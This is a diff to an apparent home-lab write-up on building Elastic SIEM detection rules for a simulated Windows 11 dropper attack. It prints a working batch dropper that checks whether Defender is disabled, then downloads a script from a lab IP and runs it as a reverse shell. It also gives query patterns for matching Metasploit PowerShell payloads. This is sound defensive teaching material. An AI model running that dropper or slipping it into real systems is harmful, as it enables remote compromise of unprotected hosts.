@@ -502,9 +502,9 @@ A good afterthought is how would we want to alert on a potential DDoS attack, wh
 # Alert Scenario 2
 
 ## Overview
-A dropper file will contain a script to determine if Microsoft Defender is enabled or disabled on the Windows 11 VM. If the Microsoft Defender is disabled, then the dropper file will then download a malicious script to execute a remote reverse shell to connect the Windows 11 VM to ParrotOS.
+A dropper file located on the Windows 11 VM will contain a script to determine if Microsoft Defender is enabled or disabled. If Microsoft Defender is disabled, then the dropper file will then download a malicious script to execute a remote reverse shell to connect to the ParrotOS VM.
 
-Detections will be created to alert on downloading the initial dropper file, downloading the reverse shell script file, and the execution of a reverse shell connection. 
+Detections will be created to alert on downloading batch files on an unusual port, PowerShell scripts being launched from a batch file, batch files downloaded by PowerShell using `Invoke-WebRequest` command, and Command Line/PowerShell commands matching strings potentially found in a malicious Metasploit payload.
 
 The dropper file contains the below PowerShell script. In a nutshell, it runs the `Get-MPComputerStatus` command which returns a list of properties and their values (True, False, etc). The script then checks to see if the property `RealTimeProtectionEnabled` (Windows Defender) is equal to false. If the property value is equal to false, then execute the designated malicious payload script.
 
@@ -567,15 +567,15 @@ run
 
 
 
+From the Windows 11 VM and scope of this project/course, we will manually create and "place" the dropper file on the Desktop. Using a code editor (Visual Studio Code, Notepad++, etc.) save the below as a batch file (e.g. "testing.bat") and run.
 
-
-
-Testing.bat
 
 ```
 @ECHO OFF
 powershell -Command "& {if ((Get-MPComputerStatus).RealTimeProtectionEnabled -eq $false) {Invoke-WebRequest -URI http://192.168.56.104:8000/shell.txt -OutFile c:\Windows\temp\shell.bat; c:\Windows\temp\shell.bat}}"
 ```
+
+
 
 
 
@@ -606,8 +606,9 @@ We also know that logs pertaining to PowerShell execution should be captured by 
 - What is the parent process name?
 - What commands/scripts did the parent process execute?
 - What commands/scripts did the child process execute?
+- On which host machine is the unusual PowerShell execution osberved on?
 
-The fields `process.parent.name`, `process.parent.command_line`, and `process.command_line` can be toggled to help answer these questions and provide context.
+The fields `process.parent.name`, `process.parent.command_line`, `process.command_line`, and `host.hostname` can be toggled to help answer these questions and provide context.
 
 ```
 event.dataset: windows.sysmon_operational
@@ -675,11 +676,148 @@ Schedule Rule
 
 ## Query-Based Detection #2
 
+Using the context of a batch file executing a PowerShell command, we can build a detection that hones in on this event with the query below.
+
+```
+event.dataset: "windows.sysmon_operational" and process.command_line: powershell* and process.parent.command_line: *bat* and process.parent.name: "cmd.exe"
+```
+
+
+To build a query-based detection alert, navigate to Security > Rules > Detection Rules > Create new rule > Custom query and paste in the query we created above into the Custom query field. The following details and settings below can be applied to the rule.
+
+Define Rule
+
+- Custom Query: `event.dataset: "windows.sysmon_operational" and process.command_line: powershell* and process.parent.command_line: *bat* and process.parent.name: "cmd.exe"`
+
+- Suppress alerts by: `host.hostname`
+
+- Suppress per time period: 5 Minutes
+
+>[!NOTE]  
+> The reason why alert suppression is needed is to avoid creating multiple alerts for one particular event. We can suppress by individual host machines (`host.hostname`) to ensure we don't creating multiple alerts on one particular event on a specific host, but leave room to allow alerts to generate if another host machine is exhibiting unusual batch file/PowerShell activity.
 
 
 
 
+About Rule
+- Name: PowerShell Execution via Batch File
 
+- Description: Sysmon identifying PowerShell script execution via batch file.
+
+- Severity: High
+
+- Risk Score: 75
+
+- Advanced Settings
+    - MITRE ATT&CK Threats
+        - Tactic: Execution (TA0002)
+        - Technique: Command and Scripting interpreter (T1059)
+        - Subtechnique: PowerShell (T1059.001)
+
+Schedule Rule
+
+- Runs every: 5 Minutes
+
+- Additional look-back time: 5 Minutes
+
+
+## Query-Based Detection #3
+
+Using the context batch files being downloaded by a `Invoke-WebRequest` command in PowerShell, we can build a detection that hones in on this event with the query below.
+
+```
+event.dataset: "windows.sysmon_operational" and process.parent.name: powershell.exe and process.parent.command_line: *Invoke-WebRequest* and process.command_line: *bat*
+```
+
+To build a query-based detection alert, navigate to Security > Rules > Detection Rules > Create new rule > Custom query and paste in the query we created above into the Custom query field. The following details and settings below can be applied to the rule.
+
+Define Rule
+
+- Custom Query: `event.dataset: event.dataset: "windows.sysmon_operational" and process.parent.name: powershell.exe and process.parent.command_line: *Invoke-WebRequest* and process.command_line: *bat*`
+
+- Suppress alerts by: `host.hostname`
+
+- Suppress per time period: 5 Minutes
+
+>[!NOTE]  
+> The reason why alert suppression is needed is to avoid creating multiple alerts for one particular event. We can suppress by individual host machines (`host.hostname`) to ensure we don't creating multiple alerts on one particular event on a specific host, but leave room to allow alerts to generate if another host machine is exhibiting unusual batch file downloads launched by PowerShell.
+
+
+
+
+About Rule
+- Name: Batch File Downloaded via PowerShell Invoke-WebRequest 
+
+- Description: Sysmon identifying batch files downloaded by PowerShell Invoke-WebRequest command.
+
+- Severity: High
+
+- Risk Score: 75
+
+- Advanced Settings
+    - MITRE ATT&CK Threats
+        - Tactic: Execution (TA0002)
+        - Technique: Command and Scripting interpreter (T1059)
+        - Subtechnique: PowerShell (T1059.001)
+
+Schedule Rule
+
+- Runs every: 5 Minutes
+
+- Additional look-back time: 5 Minutes
+
+
+
+
+## Query-Based Detection #4
+
+Using the context identifying specific strings contained in Metasploit reverse shell payload, we can build a detection that hones in on this event with the query below.
+
+```
+event.dataset: "windows.sysmon_operational" and process.command_line: \"cmd.exe\" and message: "*powershell -w hidden -nop -c $a='*"
+```
+
+
+>[!NOTE]  
+> The field `message` is used instead as the `process.parent.command_line` field was marked as an Ignored Value (can't be searched or filtered for) due to being too long. The `message` field contains the string we're looking for and is searchable, thus makes a good alternative to include as part of the query.
+
+
+To build a query-based detection alert, navigate to Security > Rules > Detection Rules > Create new rule > Custom query and paste in the query we created above into the Custom query field. The following details and settings below can be applied to the rule.
+
+Define Rule
+
+- Custom Query: `event.dataset: "windows.sysmon_operational" and process.command_line: \"cmd.exe\" and message: "*powershell -w hidden -nop -c $a='*"`
+
+- Suppress alerts by: `host.hostname`
+
+- Suppress per time period: 5 Minutes
+
+>[!NOTE]  
+> The reason why alert suppression is needed is to avoid creating multiple alerts for one particular event. We can suppress by individual host machines (`host.hostname`) to ensure we don't creating multiple alerts on one particular event on a specific host, but leave room to allow alerts to generate if another host machine is executing a command that contains the matched unusual string.
+
+
+
+
+About Rule
+- Name: Potential Metasploit PowerShell Payload Observed 
+
+- Description: Sysmon identifying command line strings that potentially match a Metasploit (msfvenom) PowerShell payload.
+
+- Severity: High
+
+- Risk Score: 75
+
+- Advanced Settings
+    - MITRE ATT&CK Threats
+        - Tactic: Execution (TA0002)
+        - Technique: Command and Scripting interpreter (T1059)
+        - Subtechnique: PowerShell (T1059.001)
+
+Schedule Rule
+
+- Runs every: 5 Minutes
+
+- Additional look-back time: 5 Minutes
 
 
 
